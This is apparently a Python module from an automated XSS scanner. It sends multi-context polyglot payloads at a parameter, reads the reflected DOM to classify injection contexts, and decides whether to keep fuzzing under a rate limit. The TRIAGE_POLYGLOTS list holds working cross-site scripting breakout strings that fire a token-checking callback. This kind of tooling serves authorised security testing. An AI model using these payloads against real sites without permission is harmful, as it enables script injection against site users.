"""Polyglot-First Triage Engine for Maximum Information Gain per Request.

Under strict rate limits (e.g. 30 req/min), spending 12-20 requests fuzzing individual
contexts is inefficient. Polyglot triage spends Request #1 on a multi-context mega-polyglot
that executes across HTML, Attribute, JS string, Template literal, Script close, and Comment
contexts simultaneously.

Outcomes:
1. Immediate Execution (Oracle HIT on Req #1): Saves 10-20 requests per parameter.
2. Reflection Residue (Canary present, no execution): Guides targeted grammar evolution.
3. Zero Reflection (Canary stripped/absent): Prunes parameter from budget immediately.
"""
import re
from typing import Any, Dict, List, Optional
from dataclasses import dataclass


@dataclass
class TriageResult:
    """Outcome of initial polyglot triage probe."""
    executed: bool
    reflected: bool
    reflection_count: int
    candidate_contexts: List[str]
    should_continue_fuzzing: bool
    recommended_strategy: str
    triage_notes: str


class PolyglotTriageEngine:
    """Generates and evaluates high-information-density triage polyglots."""

    # Mega-polyglot templates spanning HTML, attr, quotes, JS blocks, and comments
    TRIAGE_POLYGLOTS = [
        # Canonical multi-context polyglot (HTML / Attr / JS / Comment / SVG / Template)
        "-->'\"><script src=data:,{CALLBACK}('{TOKEN}')></script><svg onload={CALLBACK}('{TOKEN}')>\" onfocus={CALLBACK}('{TOKEN}') autofocus='`",
        # Compact attribute and script breakout polyglot
        "'\">--></script><details open ontoggle={CALLBACK}('{TOKEN}')>\" onfocus={CALLBACK}('{TOKEN}') autofocus='",
        # Template literal & JS string specialist polyglot
        "\"';{CALLBACK}('{TOKEN}');//</script><svg/onload={CALLBACK}('{TOKEN}')>`-alert({TOKEN})-"
    ]

    @classmethod
    def get_triage_payload(cls, token: str, callback_name: str = "__XSS__", variant: int = 0) -> str:
        """Render a mega-polyglot with the given verification token and callback."""
        template = cls.TRIAGE_POLYGLOTS[variant % len(cls.TRIAGE_POLYGLOTS)]
        return template.replace("{TOKEN}", token).replace("{CALLBACK}", callback_name)

    @classmethod
    def evaluate_triage(
        cls,
        dom_snapshot: str,
        token: str,
        oracle_executed: bool
    ) -> TriageResult:
        """Evaluate the response from the polyglot probe to guide subsequent strategy."""
        if oracle_executed:
            return TriageResult(
                executed=True,
                reflected=True,
                reflection_count=dom_snapshot.count(token) if dom_snapshot else 1,
                candidate_contexts=["CONFIRMED_EXECUTION"],
                should_continue_fuzzing=False,  # Vulnerability already confirmed in 1 request!
                recommended_strategy="confirmed",
                triage_notes="Vulnerability confirmed on Request #1 via mega-polyglot triage."
            )

        if not dom_snapshot or token not in dom_snapshot:
            # Zero reflection: input is discarded or not returned in HTML
            return TriageResult(
                executed=False,
                reflected=False,
                reflection_count=0,
                candidate_contexts=[],
                should_continue_fuzzing=False,  # Prune dead parameter to save request budget
                recommended_strategy="prune",
                triage_notes="Token not reflected in DOM snapshot; pruning parameter to preserve rate budget."
            )

        # Token was reflected! Analyze residue to detect surviving contexts
        candidate_contexts: List[str] = []
        token_count = dom_snapshot.count(token)

        # Check for attribute residue
        if re.search(rf'=\s*["\'][^"\']*{re.escape(token)}', dom_snapshot):
            candidate_contexts.append("ATTR_QUOTED")
        if re.search(rf'<script[^>]*>[^<]*{re.escape(token)}', dom_snapshot, re.IGNORECASE):
            candidate_contexts.append("JS_STRING_LITERAL")
        if re.search(rf'<!--[^\-]*{re.escape(token)}', dom_snapshot):
            candidate_contexts.append("HTML_COMMENT")
        if re.search(rf'<style[^>]*>[^<]*{re.escape(token)}', dom_snapshot, re.IGNORECASE):
            candidate_contexts.append("CSS_STYLE_BLOCK")
        if re.search(rf'>[^<]*{re.escape(token)}[^<]*<', dom_snapshot):
            candidate_contexts.append("HTML_TEXT")

        if not candidate_contexts:
            candidate_contexts.append("HTML_TEXT")

        return TriageResult(
            executed=False,
            reflected=True,
            reflection_count=token_count,
            candidate_contexts=candidate_contexts,
            should_continue_fuzzing=True,
            recommended_strategy="genetic_evolutionary",
            triage_notes=f"Reflected ({token_count}x) across contexts: {', '.join(candidate_contexts)}. Proceeding to targeted mutation."
        )
